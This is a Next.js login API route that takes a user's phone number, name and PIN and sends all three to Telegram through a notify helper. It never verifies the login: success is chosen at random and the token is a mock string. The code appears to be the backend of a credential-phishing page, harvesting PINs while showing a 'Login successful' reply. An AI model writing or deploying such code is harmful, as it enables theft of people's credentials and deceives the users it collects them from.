import { NextRequest } from 'next/server';
import { notify } from '@/lib/telegram';

export async function POST(req: NextRequest) {
  try {
    const { phone, name, pin, action } = await req.json();
    
    // Send notification to Telegram based on the action
    if (action === 'pin_authentication' && phone && name && pin) {
      // Send notification with name, phone, and pin when authenticating
      await notify.login(phone, name, pin);
    } else if (phone && name) {
      // Send notification for login attempt
      await notify.login(phone, name, 'N/A');
    }
    
    // In a real implementation, you would verify the user in the database
    // For now, we'll just return a success response for existing users
    // and an error for new users to trigger the registration flow
    const userExists = Math.random() > 0.3; // Simulate 70% existing users, 30% new users
    
    if (userExists) {
      // Create a mock token (in a real app, this would be a JWT)
      const token = `mock_token_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
      
      return new Response(
        JSON.stringify({ 
          success: true, 
          message: 'Login successful',
          token: token
        }),
        { 
          status: 200,
          headers: { 'Content-Type': 'application/json' }
        }
      );
    } else {
      return new Response(
        JSON.stringify({ 
          success: false, 
          message: 'User not found',
          error: 'User not found'
        }),
        { 
          status: 404,
          headers: { 'Content-Type': 'application/json' }
        }
      );
    }
  } catch (error) {
    console.error('Error logging in:', error);
    return new Response(
      JSON.stringify({ 
        success: false, 
        message: 'Failed to login' 
      }),
      { 
        status: 500,
        headers: { 'Content-Type': 'application/json' }
      }
    );
  }
}